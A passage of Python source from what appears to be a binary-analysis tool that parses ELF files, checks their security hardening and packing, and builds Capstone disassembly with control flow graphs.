        is_64bit = ei_class == 2
        
        # Get architecture
        if is_64bit:
            e_machine = struct.unpack('<H', data[18:20])[0]
            e_entry = struct.unpack('<Q', data[24:32])[0]
        else:
            e_machine = struct.unpack('<H', data[18:20])[0]
            e_entry = struct.unpack('<I', data[24:28])[0]
        
        arch_map = {
            # x86 family
            0x03: "x86",
            0x3E: "x86_64",
            # ARM family
            0x28: "ARM",
            0xB7: "ARM64",
            # MIPS family
            0x08: "MIPS",
            0x09: "MIPS64",
            # PowerPC (IBM servers, automotive)
            0x14: "PowerPC",
            0x15: "PowerPC64",
            # SPARC (legacy enterprise)
            0x02: "SPARC",
            0x12: "SPARC32PLUS",
            0x2B: "SPARC64",
            # RISC-V (20+ billion cores by 2025)
            0xF3: "RISCV",
            # Motorola 68k (legacy embedded)
            0x04: "M68K",
            # eBPF (Linux kernel)
            0xF7: "BPF",
        }
        architecture = arch_map.get(e_machine, f"unknown (0x{e_machine:x})")
        
        # Get ELF type
        e_type = struct.unpack('<H', data[16:18])[0]
        type_map = {1: "Relocatable", 2: "Executable", 3: "Shared Object", 4: "Core"}
        file_type = f"ELF {type_map.get(e_type, 'Unknown')} ({64 if is_64bit else 32}-bit)"
        
        return BinaryMetadata(
            file_type=file_type,
            architecture=architecture,
            file_size=len(data),
            entry_point=e_entry,
            is_packed=False,
            sections=[],
            headers={"e_machine": f"0x{e_machine:x}", "e_entry": f"0x{e_entry:x}"},
        )
    except Exception as e:
        logger.error(f"ELF parsing error: {e}")
        return None


def parse_elf_with_pyelftools(file_path: Path) -> tuple[Optional[BinaryMetadata], List[ELFSymbol], List[ImportedFunction], List[str], Optional[Dict[str, Any]]]:
    """Parse ELF file using pyelftools for comprehensive analysis."""
    if not PYELFTOOLS_AVAILABLE:
        return None, [], [], [], None
    
    try:
        with open(file_path, 'rb') as f:
            elf = ELFFile(f)
            
            # Basic metadata
            is_64bit = elf.elfclass == 64
            arch_map = {
                # x86 family
                'EM_386': 'x86',
                'EM_X86_64': 'x86_64',
                # ARM family
                'EM_ARM': 'ARM',
                'EM_AARCH64': 'ARM64',
                # MIPS family
                'EM_MIPS': 'MIPS',
                'EM_MIPS_X': 'MIPS',
                # PowerPC (IBM servers, automotive, aerospace)
                'EM_PPC': 'PPC',
                'EM_PPC64': 'PPC64',
                # SPARC (legacy enterprise, Oracle/Sun)
                'EM_SPARC': 'SPARC',
                'EM_SPARC32PLUS': 'SPARC',
                'EM_SPARCV9': 'SPARC64',
                # RISC-V (20+ billion cores by 2025)
                'EM_RISCV': 'RISCV',
                # Motorola 68k (legacy embedded)
                'EM_68K': 'M68K',
                'EM_88K': 'M88K',
                # eBPF (Linux kernel programs)
                'EM_BPF': 'BPF',
            }
            architecture = arch_map.get(elf['e_machine'], elf['e_machine'])
            
            # ELF type
            type_map = {
                'ET_REL': 'Relocatable',
                'ET_EXEC': 'Executable',
                'ET_DYN': 'Shared Object/PIE',
                'ET_CORE': 'Core Dump',
            }
            elf_type = type_map.get(elf['e_type'], elf['e_type'])
            file_type = f"ELF {elf_type} ({64 if is_64bit else 32}-bit)"
            
            # Entry point
            entry_point = elf['e_entry']
            
            # Parse sections with entropy
            sections = []
            text_section_data = None
            text_section_addr = None
            elf_build_id = None
            elf_program_headers = []
            elf_relocations = {"total": 0, "sections": []}
            elf_version_info = {"definitions": [], "requirements": []}
            
            for section in elf.iter_sections():
                section_name = section.name
                section_data = section.data() if hasattr(section, 'data') else b''
                entropy = calculate_entropy(section_data) if section_data else 0.0
                
                sections.append({
                    "name": section_name,
                    "type": section['sh_type'],
                    "address": section['sh_addr'],
                    "offset": section['sh_offset'],
                    "size": section['sh_size'],
                    "entropy": round(entropy, 2),
                    "flags": f"0x{section['sh_flags']:x}",
                })
                
                if hasattr(section, "iter_notes") and not elf_build_id:
                    try:
                        for note in section.iter_notes():
                            note_type = note.get("n_type")
                            note_name = note.get("n_name")
                            if note_name == "GNU" and str(note_type) in ("NT_GNU_BUILD_ID", "3"):
                                desc = note.get("n_desc", b"")
                                if isinstance(desc, bytes):
                                    elf_build_id = desc.hex()
                                    break
                    except Exception:
                        pass

                if isinstance(section, RelocationSection):
                    try:
                        reloc_count = section.num_relocations()
                    except Exception:
                        try:
                            reloc_count = len(list(section.iter_relocations()))
                        except Exception:
                            reloc_count = 0
                    elf_relocations["total"] += reloc_count
                    if len(elf_relocations["sections"]) < 10:
                        elf_relocations["sections"].append({
                            "name": section_name,
                            "relocations": reloc_count,
                            "type": section['sh_type'],
                        })

                if isinstance(section, GNUVerDefSection):
                    try:
                        for verdef in section.iter_versions():
                            ver_name = getattr(verdef, "name", None)
                            if isinstance(ver_name, bytes):
                                ver_name = ver_name.decode("utf-8", errors="ignore")
                            elf_version_info["definitions"].append({
                                "name": ver_name,
                                "index": getattr(verdef, "index", None),
                                "flags": getattr(verdef, "flags", None),
                            })
                    except Exception:
                        pass

                if isinstance(section, GNUVerNeedSection):
                    try:
                        for verneed in section.iter_versions():
                            aux_names = []
                            aux_iter = None
                            try:
                                aux_iter = verneed.iter_auxiliary()
                            except Exception:
                                aux_iter = getattr(verneed, "auxiliary", [])
                            for aux in aux_iter or []:
                                aux_name = getattr(aux, "name", None) or str(aux)
                                if isinstance(aux_name, bytes):
                                    aux_name = aux_name.decode("utf-8", errors="ignore")
                                aux_names.append(aux_name)
                            file_name = getattr(verneed, "name", None)
                            if isinstance(file_name, bytes):
                                file_name = file_name.decode("utf-8", errors="ignore")
                            elf_version_info["requirements"].append({
                                "file": file_name,
                                "versions": aux_names[:10],
                            })
                    except Exception:
                        pass

                # Save .text section for disassembly
                if section_name == '.text':
                    text_section_data = section_data
                    text_section_addr = section['sh_addr']
            
            # Check for security features
            relro = "None"
            stack_canary = False
            nx_enabled = False
            pie_enabled = elf['e_type'] == 'ET_DYN'
            interpreter = None
            linked_libraries = []
            elf_dynamic = {
                "soname": None,
                "rpath": None,
                "runpath": None,
                "flags": [],
                "flags_1": [],
                "needed": [],
            }
            
            for segment in elf.iter_segments():
                seg_type = segment['p_type']
                flags = segment['p_flags']
                flag_str = "".join([
                    "R" if flags & 0x4 else "-",
                    "W" if flags & 0x2 else "-",
                    "X" if flags & 0x1 else "-",
                ])
                elf_program_headers.append({
                    "type": seg_type,
                    "offset": segment['p_offset'],
                    "vaddr": segment['p_vaddr'],
                    "filesz": segment['p_filesz'],
                    "memsz": segment['p_memsz'],
                    "flags": flag_str,
                    "align": segment['p_align'],
                })
                
                # Check for interpreter (dynamic linker)
                if seg_type == 'PT_INTERP':
                    interpreter = segment.get_interp_name()
                
                # Check for GNU_RELRO
                if seg_type == 'PT_GNU_RELRO':
                    relro = "Partial"
                
                # Check for GNU_STACK (NX)
                if seg_type == 'PT_GNU_STACK':
                    # If execute flag is not set, NX is enabled
                    if not (segment['p_flags'] & 0x1):  # PF_X
                        nx_enabled = True
            
            # Parse dynamic section for BIND_NOW (Full RELRO) and libraries
            for section in elf.iter_sections():
                if isinstance(section, DynamicSection):
                    for tag in section.iter_tags():
                        if tag.entry.d_tag == 'DT_BIND_NOW':
                            relro = "Full"
                        elif tag.entry.d_tag == 'DT_FLAGS' and tag.entry.d_val & 0x8:  # DF_BIND_NOW
                            relro = "Full"
                        elif tag.entry.d_tag == 'DT_NEEDED':
                            linked_libraries.append(tag.needed)
                            elf_dynamic["needed"].append(tag.needed)
                        elif tag.entry.d_tag == 'DT_SONAME':
                            elf_dynamic["soname"] = getattr(tag, "soname", None)
                        elif tag.entry.d_tag == 'DT_RPATH':
                            elf_dynamic["rpath"] = getattr(tag, "rpath", None)
                        elif tag.entry.d_tag == 'DT_RUNPATH':
                            elf_dynamic["runpath"] = getattr(tag, "runpath", None)
                        elif tag.entry.d_tag == 'DT_FLAGS':
                            flags_val = tag.entry.d_val
                            elf_dynamic["flags"] = [name for bit, name in ELF_DT_FLAGS.items() if flags_val & bit]
                        elif tag.entry.d_tag == 'DT_FLAGS_1':
                            flags_val = tag.entry.d_val
                            elf_dynamic["flags_1"] = [name for bit, name in ELF_DT_FLAGS_1.items() if flags_val & bit]
            
            # Parse symbol tables
            symbols = []
            imports = []
            exports = []
            
            for section in elf.iter_sections():
                if isinstance(section, SymbolTableSection):
                    for symbol in section.iter_symbols():
                        sym_name = symbol.name
                        if not sym_name:
                            continue
                        
                        sym_type = symbol['st_info']['type']
                        sym_bind = symbol['st_info']['bind']
                        sym_value = symbol['st_value']
                        sym_size = symbol['st_size']
                        sym_shndx = symbol['st_shndx']
                        
                        # Determine if imported or exported
                        is_imported = sym_shndx == 'SHN_UNDEF' and sym_bind == 'STB_GLOBAL'
                        is_exported = sym_shndx != 'SHN_UNDEF' and sym_bind in ('STB_GLOBAL', 'STB_WEAK')
                        
                        # Check for suspicious functions
                        is_suspicious = sym_name in SUSPICIOUS_ELF_FUNCTIONS
                        reason = SUSPICIOUS_ELF_FUNCTIONS.get(sym_name)
                        
                        # Check stack canary
                        if sym_name == '__stack_chk_fail':
                            stack_canary = True
                        
                        elf_symbol = ELFSymbol(
                            name=sym_name,
                            address=sym_value,
                            size=sym_size,
                            symbol_type=sym_type,
                            binding=sym_bind,
                            section=str(sym_shndx),
                            is_imported=is_imported,
                            is_exported=is_exported,
                            is_suspicious=is_suspicious,
                            reason=reason,
                        )
                        symbols.append(elf_symbol)
                        
                        # Build imports/exports lists
                        if is_imported:
                            imports.append(ImportedFunction(
                                name=sym_name,
                                library="(dynamic)",
                                is_suspicious=is_suspicious,
                                reason=reason,
                            ))
                        if is_exported and sym_type == 'STT_FUNC':
                            exports.append(sym_name)
            
            # Try to parse DWARF info
            dwarf_info = None
            if elf.has_dwarf_info():
                try:
                    dwarf = elf.get_dwarf_info()
                    dwarf_info = {
                        "has_debug_info": True,
                        "compilation_units": [],
                        "source_files": [],
                    }
                    
                    for cu in dwarf.iter_CUs():
                        die = cu.get_top_DIE()
                        cu_info = {
                            "name": die.attributes.get('DW_AT_name', {}).value if 'DW_AT_name' in die.attributes else "unknown",
                            "producer": die.attributes.get('DW_AT_producer', {}).value if 'DW_AT_producer' in die.attributes else None,
                            "language": die.attributes.get('DW_AT_language', {}).value if 'DW_AT_language' in die.attributes else None,
                        }
                        # Decode bytes to string if needed
                        if isinstance(cu_info["name"], bytes):
                            cu_info["name"] = cu_info["name"].decode('utf-8', errors='ignore')
                        if isinstance(cu_info["producer"], bytes):
                            cu_info["producer"] = cu_info["producer"].decode('utf-8', errors='ignore')
                        dwarf_info["compilation_units"].append(cu_info)
                    
                    # Limit to first 10 CUs
                    dwarf_info["compilation_units"] = dwarf_info["compilation_units"][:10]
                except Exception as e:
                    logger.warning(f"Failed to parse DWARF info: {e}")
                    dwarf_info = {"has_debug_info": True, "error": str(e)}
            
            # Check for packing (high entropy in code sections)
            is_packed = False
            packer_name = None
            code_sections = [s for s in sections if s["name"] in ('.text', '.code', '.init', '.fini')]
            high_entropy_code = [s for s in code_sections if s["entropy"] > 7.0]
            if high_entropy_code:
                is_packed = True
                packer_name = "Unknown (high entropy in code sections)"
            
            # Check for UPX
            section_names = [s["name"] for s in sections]
            if 'UPX0' in section_names or 'UPX1' in section_names:
                is_packed = True
                packer_name = "UPX"

            if elf_version_info["definitions"]:
                elf_version_info["definitions"] = elf_version_info["definitions"][:20]
            if elf_version_info["requirements"]:
                elf_version_info["requirements"] = elf_version_info["requirements"][:20]
            
            metadata = BinaryMetadata(
                file_type=file_type,
                architecture=architecture,
                file_size=file_path.stat().st_size,
                entry_point=entry_point,
                is_packed=is_packed,
                packer_name=packer_name,
                sections=sections,
                headers={
                    "e_machine": elf['e_machine'],
                    "e_type": elf['e_type'],
                    "e_entry": f"0x{entry_point:x}",
                    "e_phnum": elf['e_phnum'],
                    "e_shnum": elf['e_shnum'],
                },
                interpreter=interpreter,
                linked_libraries=linked_libraries,
                relro=relro,
                stack_canary=stack_canary,
                nx_enabled=nx_enabled,
                pie_enabled=pie_enabled,
                elf_dynamic=elf_dynamic,
                elf_relocations=elf_relocations,
                elf_version_info=elf_version_info,
                elf_build_id=elf_build_id,
                elf_program_headers=elf_program_headers[:20],
            )
            
            return metadata, symbols, imports, exports, dwarf_info
            
    except Exception as e:
        logger.error(f"pyelftools parsing error: {e}")
        return None, [], [], [], None


def calculate_entropy(data: bytes) -> float:
    """Calculate Shannon entropy of data."""
    if not data:
        return 0.0
    
    byte_counts = {}
    for byte in data:
        byte_counts[byte] = byte_counts.get(byte, 0) + 1
    
    entropy = 0.0
    length = len(data)
    for count in byte_counts.values():
        if count > 0:
            p = count / length
            entropy -= p * math.log2(p)
    
    return entropy


# ============================================================================
# Capstone Disassembly Functions - Enhanced with CFG and Cross-References
# ============================================================================

def get_capstone_instance(architecture: str) -> Optional[Any]:
    """Get a Capstone disassembler instance for the given architecture."""
    if not CAPSTONE_AVAILABLE:
        return None
    
    arch_mode_map = {
        # x86 family
        'x86': (CS_ARCH_X86, CS_MODE_32),
        'x86_64': (CS_ARCH_X86, CS_MODE_64),
        'i386': (CS_ARCH_X86, CS_MODE_32),
        'AMD64': (CS_ARCH_X86, CS_MODE_64),

        # ARM family
        'ARM': (CS_ARCH_ARM, CS_MODE_ARM),
        'ARM64': (CS_ARCH_ARM64, CS_MODE_ARM),
        'AArch64': (CS_ARCH_ARM64, CS_MODE_ARM),
        'ARM_THUMB': (CS_ARCH_ARM, CS_MODE_THUMB),  # NEW: Cortex-M, IoT devices
        'ARMTHUMB': (CS_ARCH_ARM, CS_MODE_THUMB),
        'THUMB': (CS_ARCH_ARM, CS_MODE_THUMB),

        # MIPS family
        'MIPS': (CS_ARCH_MIPS, CS_MODE_MIPS32),
        'MIPS64': (CS_ARCH_MIPS, CS_MODE_MIPS64),

        # RISC-V (CRITICAL: 20+ billion cores by 2025)
        'RISCV': (CS_ARCH_RISCV, CS_MODE_RISCV32),  # NEW: Default to 32-bit
        'RISCV32': (CS_ARCH_RISCV, CS_MODE_RISCV32),  # NEW
        'RISCV64': (CS_ARCH_RISCV, CS_MODE_RISCV64),  # NEW
        'RV32': (CS_ARCH_RISCV, CS_MODE_RISCV32),
        'RV64': (CS_ARCH_RISCV, CS_MODE_RISCV64),

        # PowerPC (IBM servers, automotive, aerospace)
        'PPC': (CS_ARCH_PPC, CS_MODE_32),  # NEW
        'PPC64': (CS_ARCH_PPC, CS_MODE_64),  # NEW
        'POWERPC': (CS_ARCH_PPC, CS_MODE_32),
        'POWERPC64': (CS_ARCH_PPC, CS_MODE_64),

        # SPARC (legacy enterprise, Oracle/Sun)
        'SPARC': (CS_ARCH_SPARC, CS_MODE_32),  # NEW
        'SPARC64': (CS_ARCH_SPARC, CS_MODE_64),  # NEW

        # Motorola 68k (legacy embedded)
        'M68K': (CS_ARCH_M68K, CS_MODE_32),  # NEW
        'M680X0': (CS_ARCH_M68K, CS_MODE_32),

        # eBPF (Linux kernel programs)
        'BPF': (CS_ARCH_BPF, CS_MODE_BPF),  # NEW
        'EBPF': (CS_ARCH_BPF, CS_MODE_BPF),
    }
    
    if architecture not in arch_mode_map:
        # Try fuzzy matching
        arch_lower = architecture.lower()
        if 'x86' in arch_lower and '64' in arch_lower:
            architecture = 'x86_64'
        elif 'x86' in arch_lower or 'i386' in arch_lower or 'i686' in arch_lower:
            architecture = 'x86'
        elif 'riscv' in arch_lower or 'risc-v' in arch_lower:
            if '64' in arch_lower:
                architecture = 'RISCV64'
            else:
                architecture = 'RISCV32'
        elif 'thumb' in arch_lower:
            architecture = 'ARM_THUMB'
        elif 'arm' in arch_lower and '64' in arch_lower:
            architecture = 'ARM64'
        elif 'arm' in arch_lower:
            architecture = 'ARM'
        elif 'ppc' in arch_lower or 'powerpc' in arch_lower:
            if '64' in arch_lower:
                architecture = 'PPC64'
            else:
                architecture = 'PPC'
        elif 'sparc' in arch_lower:
            if '64' in arch_lower:
                architecture = 'SPARC64'
            else:
                architecture = 'SPARC'
        elif 'm68k' in arch_lower or '68000' in arch_lower:
            architecture = 'M68K'
        elif 'bpf' in arch_lower or 'ebpf' in arch_lower:
            architecture = 'BPF'
        else:
            return None
    
    arch, mode = arch_mode_map.get(architecture, (None, None))
    if arch is None:
        return None
    
    try:
        md = Cs(arch, mode)
        md.detail = True  # Enable detailed instruction info
        md.skipdata = True  # Skip data when disassembling
        return md
    except Exception as e:
        logger.error(f"Failed to create Capstone instance: {e}")
        return None


def is_control_flow_instruction(mnemonic: str) -> Dict[str, bool]:
    """Determine the type of control flow instruction."""
    mnemonic_lower = mnemonic.lower()
    
    # Call instructions
    call_mnemonics = {'call', 'bl', 'blx', 'blr', 'jal', 'jalr', 'bctrl'}
    
    # Unconditional jumps
    unconditional_jumps = {'jmp', 'b', 'br', 'j', 'jr', 'bx'}
    
    # Conditional jumps (x86/x64)
    conditional_jumps = {
        'je', 'jne', 'jz', 'jnz', 'ja', 'jae', 'jb', 'jbe', 'jg', 'jge', 'jl', 'jle',
        'jo', 'jno', 'js', 'jns', 'jp', 'jnp', 'jpe', 'jpo', 'jecxz', 'jrcxz',
        'loop', 'loope', 'loopne', 'loopz', 'loopnz',
        # ARM conditional branches
        'beq', 'bne', 'bgt', 'blt', 'bge', 'ble', 'bhi', 'bls', 'bcc', 'bcs',
        'bmi', 'bpl', 'bvs', 'bvc', 'cbz', 'cbnz', 'tbz', 'tbnz',
    }
    
    # Return instructions
    return_mnemonics = {'ret', 'retn', 'retf', 'iret', 'iretd', 'iretq', 'bx lr', 'pop pc'}
    
    is_call = mnemonic_lower in call_mnemonics
    is_uncond_jump = mnemonic_lower in unconditional_jumps
    is_cond_jump = mnemonic_lower in conditional_jumps
    is_ret = mnemonic_lower in return_mnemonics or mnemonic_lower.startswith('ret')
    
    return {
        'is_call': is_call,
        'is_jump': is_uncond_jump or is_cond_jump,
        'is_conditional_jump': is_cond_jump,
        'is_return': is_ret,
        'terminates_block': is_ret or is_uncond_jump or is_cond_jump or is_call,
    }


def extract_target_address(insn, op_str: str, current_address: int) -> Optional[int]:
    """Extract the target address from a branch/call instruction."""
    try:
        # Check Capstone operands first
        if hasattr(insn, 'operands') and insn.operands:
            for op in insn.operands:
                if hasattr(op, 'type') and hasattr(op, 'imm'):
                    # Immediate operand (direct address)
                    if op.type == 2:  # CS_OP_IMM
                        return op.imm
                    # Memory operand with displacement
                    if op.type == 3 and hasattr(op, 'mem'):  # CS_OP_MEM
                        if hasattr(op.mem, 'disp') and op.mem.disp != 0:
                            return op.mem.disp
        
        # Fallback: Parse operand string
        op_str_clean = op_str.strip()
        
        # Direct address: "0x401000"
        if op_str_clean.startswith('0x'):
            addr_str = op_str_clean.split()[0].rstrip(',')
            return int(addr_str, 16)
        
        # RIP-relative: "[rip + 0x1234]" or "qword ptr [rip + 0x1234]"
        rip_match = re.search(r'\[rip\s*[+-]\s*(0x[0-9a-fA-F]+)\]', op_str_clean)
        if rip_match:
            offset = int(rip_match.group(1), 16)
            if '+' in op_str_clean:
                return current_address + insn.size + offset
            else:
                return current_address + insn.size - offset
        
        # Relative offset for jumps
        if op_str_clean.startswith('-') or op_str_clean.startswith('+'):
            offset = int(op_str_clean.replace(' ', ''), 0)
            return current_address + insn.size + offset
            
    except Exception:
        pass
    
    return None


def disassemble_at_address(data: bytes, base_address: int, start_offset: int, 
                           architecture: str, max_instructions: int = 100,
                           string_map: Optional[Dict[int, str]] = None) -> List[DisassemblyInstruction]:
    """Disassemble code at a given offset with enhanced analysis."""
    if not CAPSTONE_AVAILABLE:
        return []
    
    md = get_capstone_instance(architecture)
    if not md:
        return []
    
    instructions = []
    string_map = string_map or {}
    
    try:
        code = data[start_offset:start_offset + 8192]  # Disassemble up to 8KB
        
        for insn in md.disasm(code, base_address + start_offset):
            if len(instructions) >= max_instructions:
                break
            
            cf_info = is_control_flow_instruction(insn.mnemonic)
            
            # Check for suspicious instructions
            is_suspicious = False
            comment = None
            
            full_insn = f"{insn.mnemonic} {insn.op_str}"
            for pattern, desc in SUSPICIOUS_INSTRUCTIONS.items():
                if pattern.lower() in full_insn.lower():
                    is_suspicious = True
                    comment = desc
                    break
            
            # Extract target address for branches/calls
            target_addr = None
            if cf_info['is_call'] or cf_info['is_jump']:
                target_addr = extract_target_address(insn, insn.op_str, insn.address)
            
            # Extract register info
            reads_regs = []
            writes_regs = []
            memory_refs = []
            
            if hasattr(insn, 'regs_read') and insn.regs_read:
                reads_regs = [insn.reg_name(r) for r in insn.regs_read if insn.reg_name(r)]
            if hasattr(insn, 'regs_write') and insn.regs_write:
                writes_regs = [insn.reg_name(r) for r in insn.regs_write if insn.reg_name(r)]
            
            # Check for string references
            string_ref = None
            if target_addr and target_addr in string_map:
                string_ref = string_map[target_addr][:64]  # Truncate long strings
            
            # Extract memory references from operand string
            mem_match = re.findall(r'\[([^\]]+)\]', insn.op_str)
            memory_refs = mem_match[:3]  # Limit to 3 references
            
            instructions.append(DisassemblyInstruction(
                address=insn.address,
                mnemonic=insn.mnemonic,
                op_str=insn.op_str,
                bytes_hex=insn.bytes.hex(),
                size=insn.size,
                is_call=cf_info['is_call'],
                is_jump=cf_info['is_jump'],
                is_conditional_jump=cf_info['is_conditional_jump'],
                is_return=cf_info['is_return'],
                is_suspicious=is_suspicious,
                comment=comment,
                target_address=target_addr,
                reads_regs=reads_regs,
                writes_regs=writes_regs,
                memory_refs=memory_refs,
                string_ref=string_ref,
            ))
            
            # Stop at return or unconditional jump to unknown
            if cf_info['is_return']:
                break
            if cf_info['is_jump'] and not cf_info['is_conditional_jump'] and target_addr is None:
                break
            
    except Exception as e:
        logger.error(f"Disassembly failed: {e}")
    
    return instructions


def recursive_disassemble(data: bytes, base_address: int, start_offset: int,
                          architecture: str, max_instructions: int = 1000,
                          string_map: Optional[Dict[int, str]] = None,
                          visited: Optional[Set[int]] = None) -> Dict[int, DisassemblyInstruction]:
    """Recursively disassemble following control flow (recursive descent)."""
    if not CAPSTONE_AVAILABLE:
        return {}
    
    md = get_capstone_instance(architecture)
    if not md:
        return {}
    
    visited = visited or set()
    instructions_map = {}
    work_queue = [start_offset]
    string_map = string_map or {}
    data_len = len(data)
    
    while work_queue and len(instructions_map) < max_instructions:
        offset = work_queue.pop(0)
        
        if offset in visited or offset < 0 or offset >= data_len:
            continue
        
        visited.add(offset)
        
        try:
            code = data[offset:offset + 4096]
            if not code:
                continue
            
            for insn in md.disasm(code, base_address + offset):
                if insn.address in instructions_map:
                    break
                if len(instructions_map) >= max_instructions:
                    break
                
                cf_info = is_control_flow_instruction(insn.mnemonic)
                
                # Check for suspicious instructions
                is_suspicious = False
                comment = None
                full_insn = f"{insn.mnemonic} {insn.op_str}"
                for pattern, desc in SUSPICIOUS_INSTRUCTIONS.items():
                    if pattern.lower() in full_insn.lower():
                        is_suspicious = True
                        comment = desc
                        break
                
                # Extract target address
                target_addr = None
                if cf_info['is_call'] or cf_info['is_jump']:
                    target_addr = extract_target_address(insn, insn.op_str, insn.address)
                
                # Extract register info
                reads_regs = []
                writes_regs = []
                if hasattr(insn, 'regs_read') and insn.regs_read:
                    reads_regs = [insn.reg_name(r) for r in insn.regs_read if insn.reg_name(r)]
                if hasattr(insn, 'regs_write') and insn.regs_write:
                    writes_regs = [insn.reg_name(r) for r in insn.regs_write if insn.reg_name(r)]
                
                # Check string references
                string_ref = None
                if target_addr and target_addr in string_map:
                    string_ref = string_map[target_addr][:64]
                
                mem_refs = re.findall(r'\[([^\]]+)\]', insn.op_str)[:3]
                
                instr = DisassemblyInstruction(
                    address=insn.address,
                    mnemonic=insn.mnemonic,
                    op_str=insn.op_str,
                    bytes_hex=insn.bytes.hex(),
                    size=insn.size,
                    is_call=cf_info['is_call'],
                    is_jump=cf_info['is_jump'],
                    is_conditional_jump=cf_info['is_conditional_jump'],
                    is_return=cf_info['is_return'],
                    is_suspicious=is_suspicious,
                    comment=comment,
                    target_address=target_addr,
                    reads_regs=reads_regs,
                    writes_regs=writes_regs,
                    memory_refs=mem_refs,
                    string_ref=string_ref,
                )
                instructions_map[insn.address] = instr
                
                # Follow control flow
                if target_addr:
                    target_offset = target_addr - base_address
                    if 0 <= target_offset < data_len and target_offset not in visited:
                        if cf_info['is_conditional_jump']:
                            # For conditional jumps, explore both paths
                            work_queue.append(target_offset)
                        elif cf_info['is_jump'] and not cf_info['is_call']:
                            # For unconditional jumps, only follow target
                            work_queue.insert(0, target_offset)
                            break
                        elif cf_info['is_call']:
                            # Don't follow calls, but record them
                            work_queue.append(target_offset)
                
                # Stop at return
                if cf_info['is_return']:
                    break
                    
                # Stop at unconditional jump to register (can't follow)
                if cf_info['is_jump'] and not cf_info['is_conditional_jump'] and target_addr is None:
                    break
                
        except Exception as e:
            logger.debug(f"Recursive disassembly error at offset {offset}: {e}")
    
    return instructions_map


def build_basic_blocks(instructions: Dict[int, DisassemblyInstruction]) -> Dict[int, BasicBlock]:
    """Build basic blocks from disassembled instructions."""
    if not instructions:
        return {}
    
    # Sort instructions by address
    sorted_addrs = sorted(instructions.keys())
    
    # Find block boundaries
    block_starts = {sorted_addrs[0]}  # First instruction starts a block
    
    # Instructions that are jump targets start new blocks
    for addr in sorted_addrs:
        instr = instructions[addr]
        if instr.target_address and instr.target_address in instructions:
            block_starts.add(instr.target_address)
    
    # Instructions following jumps/calls/returns start new blocks
    for addr in sorted_addrs:
        instr = instructions[addr]
        if instr.is_jump or instr.is_return or instr.is_call:
            # Next instruction starts a new block
            next_addr = addr + instr.size
            if next_addr in instructions:
                block_starts.add(next_addr)
    
    # Build blocks
    blocks = {}
    sorted_starts = sorted(block_starts)
    
    for i, start_addr in enumerate(sorted_starts):
        # Find end of this block
        if i + 1 < len(sorted_starts):
            next_block_start = sorted_starts[i + 1]
        else:
            next_block_start = max(sorted_addrs) + instructions[max(sorted_addrs)].size + 1
        
        # Collect instructions in this block
        block_instructions = []
        for addr in sorted_addrs:
            if start_addr <= addr < next_block_start:
                block_instructions.append(instructions[addr])
        
        if not block_instructions:
            continue
        
        end_addr = block_instructions[-1].address + block_instructions[-1].size
        last_instr = block_instructions[-1]
        
        # Determine block type
        block_type = "normal"
        if last_instr.is_call:
            block_type = "call_block"
        
        blocks[start_addr] = BasicBlock(
            start_address=start_addr,
            end_address=end_addr,
            instructions=block_instructions,
            is_entry=(start_addr == sorted_starts[0]),
            is_exit=last_instr.is_return,
            block_type=block_type,
        )
    
    # Connect blocks (build CFG edges)
    for start_addr, block in blocks.items():
        if not block.instructions:
            continue
        
        last_instr = block.instructions[-1]
        
        # Fallthrough to next block (if not unconditional jump or return)
        if not last_instr.is_return and not (last_instr.is_jump and not last_instr.is_conditional_jump):
            next_addr = last_instr.address + last_instr.size
            if next_addr in blocks:
                block.successors.append(next_addr)
                blocks[next_addr].predecessors.append(start_addr)
        
        # Jump target
        if last_instr.target_address and last_instr.target_address in blocks:
            if last_instr.target_address not in block.successors:
                block.successors.append(last_instr.target_address)
                if start_addr not in blocks[last_instr.target_address].predecessors:
                    blocks[last_instr.target_address].predecessors.append(start_addr)
    
    return blocks


def build_cfg(instructions: Dict[int, DisassemblyInstruction]) -> ControlFlowGraph:
    """Build a control flow graph from instructions."""
    blocks = build_basic_blocks(instructions)
    
    if not blocks:
        return ControlFlowGraph()
    
    # Find entry block
    sorted_starts = sorted(blocks.keys())
    entry_block = sorted_starts[0]
    
    # Find exit blocks
    exit_blocks = [addr for addr, block in blocks.items() if block.is_exit]
    
    # Detect loop headers (blocks with back-edges)
    loop_headers = []
    for addr, block in blocks.items():
        for pred_addr in block.predecessors:
            if pred_addr >= addr:  # Back edge detected
                loop_headers.append(addr)
                block.block_type = "loop_header"
                break
    
    # Calculate cyclomatic complexity: E - N + 2P
    # E = edges, N = nodes, P = connected components (usually 1)
    num_edges = sum(len(block.successors) for block in blocks.values())
    num_nodes = len(blocks)
    complexity = num_edges - num_nodes + 2
    
    return ControlFlowGraph(
        blocks=blocks,
        entry_block=entry_block,
        exit_blocks=exit_blocks,
        loop_headers=loop_headers,
        complexity=max(1, complexity),
    )


def disassemble_function(data: bytes, base_address: int, func_offset: int, func_size: int,
                        func_name: str, architecture: str, symbols: List[ELFSymbol],
                        string_map: Optional[Dict[int, str]] = None) -> DisassemblyFunction:
    """Disassemble a complete function with CFG and enhanced analysis."""
    string_map = string_map or {}
    
    # Use recursive descent for better coverage
    max_instrs = min(func_size * 2, 2000)  # Allow more instructions for complex functions
    instructions_map = recursive_disassemble(
        data, base_address, func_offset, architecture, 
        max_instructions=max_instrs, string_map=string_map
    )
    
    # Build CFG
    cfg = build_cfg(instructions_map)
    
    # Build symbol address map for call resolution
    symbol_map = {s.address: s.name for s in symbols if s.symbol_type == 'STT_FUNC'}
    
    calls = []
    suspicious_patterns = []
    is_leaf = True
    is_recursive = False
    stack_frame_size = None
    
    # Analyze instructions
    instructions_list = sorted(instructions_map.values(), key=lambda x: x.address)
    
    for insn in instructions_list:
        if insn.is_call:
            is_leaf = False
            # Try to resolve call target
            if insn.target_address:
                target_addr = insn.target_address
                if target_addr in symbol_map:
                    called_name = symbol_map[target_addr]
                    calls.append(called_name)
                    if called_name == func_name:
                        is_recursive = True
                else:
                    calls.append(f"sub_{target_addr:x}")
            else:
                calls.append(insn.op_str)
        
        if insn.is_suspicious:
            suspicious_patterns.append(f"{insn.mnemonic} {insn.op_str}: {insn.comment}")
        
        # Detect stack frame setup
        if stack_frame_size is None:
            # Look for "sub rsp, X" or "sub esp, X" patterns
            if insn.mnemonic.lower() == 'sub' and 'sp' in insn.op_str.lower():
                match = re.search(r'0x([0-9a-fA-F]+)', insn.op_str)
                if match:
                    stack_frame_size = int(match.group(1), 16)
    
    # Detect calling convention (heuristic)
    calling_convention = None
    if instructions_list:
        first_instrs = instructions_list[:10]
        uses_rbp = any('rbp' in str(i.op_str) or 'rbp' in str(i.writes_regs) for i in first_instrs)
